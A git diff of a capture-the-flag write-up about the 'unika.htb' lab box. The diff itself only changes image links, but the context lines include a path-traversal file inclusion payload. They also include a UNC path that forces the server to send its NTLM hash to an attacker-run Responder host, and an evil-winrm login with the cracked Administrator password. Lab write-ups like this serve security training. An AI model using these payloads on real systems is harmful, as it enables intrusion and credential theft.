@@ -57,7 +57,7 @@ To enumerate the technologies used by the web server, I utilized `Wappalyzer`, w
 
 After identifying that the web server was running `Apache` on Windows at port `80`, I started by browsing the site manually. While there were no useful results from directory brute-forcing with tools like `gobuster`, one particular feature on the homepage caught my attention: a language selection menu. 
 
-![image.png](attachment:7b4cf157-95e9-49f8-8e88-957fbc9349ea:image.png)
+![Language Selection](images/language-selection.png)
 
 Inspecting the URL when changing the language revealed the following pattern:
 
@@ -71,7 +71,7 @@ This indicated that the page content was likely being dynamically included based
 http://unika.htb/index.php?page=../../../../../../../windows/win.ini
 ```
 
-![image.png](attachment:1077fc4a-a3ac-472b-a02d-1e8d1d3d3afb:image.png)
+![LFI Success.png](images/lfi-success.png)
 
 The file was successfully included and displayed in the browser, confirming the presence of an LFI vulnerability. At this point, I knew that the server was vulnerable to arbitrary file inclusion, and I began exploring ways to leverage this vulnerability to move further into the system.
 
@@ -97,7 +97,7 @@ http://unika.htb/index.php?page=//10.10.14.249/fakeshare
 
 As a result, the target machine tried to access the fake SMB share hosted by `Responder`, sending its NTLM authentication hash, which I successfully captured. Among these hashes was the hash for the `Administrator` user.
 
-![image.png](attachment:5f121b43-3729-4de8-a8c1-3fd8828b84bb:image.png)
+![Admin Hash.png](images/hash.png)
 
 ## Cracking the Captured NTLM Hash
 
@@ -125,7 +125,7 @@ With the cracked credentials in hand, I used **`evil-winrm`** to log into the ta
 evil-winrm -u administrator -p 'badminton' -i 10.129.197.98
 ```
 
-![image.png](attachment:00ff3809-0994-4c28-9bc6-c3392d9dad32:image.png)
+![Logged In.png](images/logged-in.png)
 
 Once inside, I used `PowerShell` to search recursively for the flag file.
 
